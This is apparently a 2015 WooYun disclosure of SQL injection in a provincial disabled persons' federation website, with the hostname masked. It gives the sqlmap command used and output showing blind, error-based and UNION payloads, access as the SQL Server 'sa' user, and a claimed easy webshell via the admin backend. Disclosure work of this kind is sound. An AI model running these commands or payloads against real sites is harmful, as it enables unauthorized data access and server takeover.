wybug_title: 某省残疾存在SQL注射直接getshell。
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-18：	细节已通知厂商并且等待厂商处理中									2015-08-19：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-08-29：	细节向核心白帽子及相关领域专家公开									2015-09-08：	细节向普通白帽子公开									2015-09-18：	细节向实习白帽子公开									2015-10-03：	细节向公众公开  简要描述： 就是这样。 详细说明：  http://**.**.**.**/ztNewsdetail.asp?Class_ID=118 (POST) Class_ID=118sqlmap.py -u "http://**.**.**.**/ztNewsdetail.asp?Class_ID=118" --data "Class_ID=118" --current-user --current-db         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150328}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:30:25[16:30:25] [INFO] resuming back-end DBMS 'microsoft sql server'[16:30:26] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Class_ID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Class_ID=118 AND 3253=3253    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Class_ID=118 AND 9731=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9731=9731) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(122)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: Class_ID=-4047 UNION ALL SELECT CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(78)+CHAR(114)+CHAR(100)+CHAR(111)+CHAR(108)+CHAR(77)+CHAR(86)+CHAR(112)+CHAR(121)+CHAR(100)+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(122)+CHAR(113)-----[16:30:27] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[16:30:27] [INFO] fetching current usercurrent user:    'sa'[16:30:27] [INFO] fetching current databasecurrent database:    'cjrdata'   漏洞证明：  http://**.**.**.**/cjradmin/ 后台 。轻松拿shell 上图。

   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-19 11:16 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖北分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
